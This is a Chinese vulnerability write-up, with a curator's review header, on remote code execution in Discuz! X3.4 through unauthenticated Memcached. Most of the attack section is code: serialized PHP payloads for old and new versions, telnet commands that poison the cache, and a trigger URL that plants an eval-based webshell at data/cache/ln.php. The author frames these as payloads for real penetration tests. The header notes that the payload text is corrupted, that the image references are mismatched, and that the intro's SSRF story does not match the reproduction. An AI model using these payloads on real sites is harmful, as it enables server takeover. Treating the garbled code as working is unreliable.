---
source: "hatch 补库批 20260928"
product: "Discuz X3.4 and earlier"
record_type: "unknown"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_role: "unknown"
identifier_status: "unknown"
title: "Discuz! X3.4 Memcached未授权访问导致的rce"
prerequisites: "来源所述条件，未列明部分仍待核：Reachable unauthenticated Memcached and known key; SSRF/curl requirements apply only indirect route; old /e variant PHP<7; new renderer separately"
side_effects: "未执行；本文需注意的操作影响：Images cross-referenced from SSRF/deletion articles; cache cleanup essential, source provided"
source_status: "unknown"
id: "vw-30f76b3942e923ff20a6f901"
entity_id: "ve-30f76b3942e923ff20a6f901"
schema_version: "1"
---

## 核对与使用边界

本文已按保存的全文审阅记录进行文字校订；本轮仅静态核对，未运行 PoC、请求目标或逐图验证。

适用条件与版本记录（来源主张，未列为明确更正的部分仍待权威资料核对）：Reachable unauthenticated Memcached and known key; SSRF/curl requirements apply only indirect route; old /e variant PHP&lt;7; new renderer separately

- **事实待核（1）**：Intro claims SSRF chain but reproduction directly connects telnet; Windows/port80/curl bounds not necessary for direct cache access。该项尚不能从转载本身确定外部事实；下文相应编号、版本或修复说法只作为来源记录，不能据此判定部署受影响或已修复。明确更正另列于本节。

- **代码与转录边界（2）**：Payload code corrupt: echoserialize lacks space, &lt;?phpeval lacks required separation, serialized lengths may not match。相应原代码作为存在此问题的历史样本保留，不能直接当作可运行、成功复现的 PoC；缺失内容需回原稿核对，不据此补造可执行攻击链。

- **结论使用边界（3）**：Old and new renderer mechanisms not fully explained, simply 'remove e' insufficient。此项限制直接适用于下文对应结论；现有正文不足以作更宽泛推论，所列方法和原始证据均保留。

- **操作与副作用边界（4）**：Images cross-referenced from SSRF/deletion articles; cache cleanup essential, source provided。保留原步骤及请求方法。执行条件包括隔离且获授权的可恢复环境、预先记录相关文件/账号/配置/业务记录状态；响应完成不能等同无副作用，恢复时须核对该操作涉及的实际对象。

历史原文标识：下文原技术材料按来源保留；仅本节明确确认的更正替代相应旧说法，标为待核的观察仍不是事实确认。

# Discuz! X3.4 Memcached未授权访问导致的rce

一、漏洞简介
------------

这个漏洞大致利用过程是这样的：利用discuz!的ssrf漏洞，利用gopher协议写入payload到memcached，然后请求特定链接导致代码执行漏洞。

二、漏洞影响
------------

-   \<= x3.4

-   windows

-   php\>5.3+php-curl\<=7.54

-   DZ开放在80端口

三、复现过程
------------

### 漏洞分析

Dz 整合 Memcache
配置成功后，默认情况下网站首页右下角会出现`MemCache On`的标志：

![](./.resource/Discuz!X3.4Memcached未授权访问导致的rce/media/rId25.jpg)

漏洞利用有两个版本，一个是老版本，一个是新版本，discuz！虽然已经是x3.4，代码也发生了变化，漏洞确是任然没有修复。

漏洞利用代码流程逻辑：

访问：

    forum.php?mod=ajax&inajax=yes&action=getthreadtypes
    ./source/module/forum/forum_ajax.php

![](./.resource/Discuz!X3.4前台ssrf/media/rId26.png)

    ./template/default/common/footer_ajax.htm

![](./.resource/Discuz!X3.4前台ssrf/media/rId27.png)

    ./source/function/function_core.php

![](./.resource/Discuz!X3.4前台ssrf/media/rId28.png)

    ./source/function/function_core.php

![](./.resource/Discuz!X3.4前台ssrf/media/rId29.png)

最后利用`preg_replace`函数`/e`参数的代码执行特性完成了漏洞利用的全部过程。

以上是老版本代码，在网上已经有一些分析了，在这里简述一些，重点是payload的完整性使用。网上文章大部分在payload部分都只是验证性演示。作为一名红队渗透测试人员，验证性payload肯定是不能再实际渗透测试活动中使用的。

### 漏洞复现

***1 老版本漏洞利用流程：***

生成payload

    <?php
    $payload['output']['preg']['search']['plugins']= "/.*/e";
    $payload['output']['preg']['replace']['plugins']= "file_put_contents('./data/cache/ln.php','<?phpeval(\$_POST[x]);?>');";
    $payload['rewritestatus']['plugins']= 1;
    echoserialize($payload);
    a:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";a:1:{s:7:"plugins";s:5:"/.*/e";}s:7:"replace";a:1:{s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','<?phpeval($_POST[x]);?>');";}}}s:13:"rewritestatus";a:1:{s:7:"plugins";i:1;}}

然后telnet链接memcached

    telnet 1.1.1.1 11211
    set xxxxxx_setting 1 0 yyy    //xxxx为前缀，discuz定义的，可以使用stats cachedump 命令查看。yyy为payload长度。

![](./.resource/Discuz!X3.4前台ssrf/media/rId31.png)

最后访问**forum.php?mod=ajax&inajax=yes&action=getthreadtypes**

shell生成\*\*/data/cache/ln.php\*\*

***2 新版本漏洞利用流程***

生成payload有点变化(ps:只是少了一个e)

    <?php
    $payload['output']['preg']['search']['plugins']= "/.*/";
    $payload['output']['preg']['replace']['plugins']= "file_put_contents('./data/cache/ln.php','<?phpeval(\$_POST[x]);?>');";
    $payload['rewritestatus']['plugins']= 1;
    echoserialize($payload);
    a:2:{s:6:"output";a:1:{s:4:"preg";a:2:{s:6:"search";a:1:{s:7:"plugins";s:4:"/.*/";}s:7:"replace";a:1:{s:7:"plugins";s:68:"file_put_contents('./data/cache/ln.php','<?phpeval($_POST[x]);?>');";}}}s:13:"rewritestatus";a:1:{s:7:"plugins";i:1;}}

![](./.resource/Discuz!X3.4前台ssrf/media/rId32.png)

访问:**forum.php?mod=ajax&inajax=yes&action=getthreadtypes**

![](./.resource/Discuz!X3.4前台ssrf/media/rId33.png)

最后一定要恢复缓存

Delete Vtfbsm\_setting

成功写入文件

![](./.resource/Discuz!X3.4任意文件删除漏洞/media/rId34.png)

参考链接
--------

> https://xz.aliyun.com/t/2018
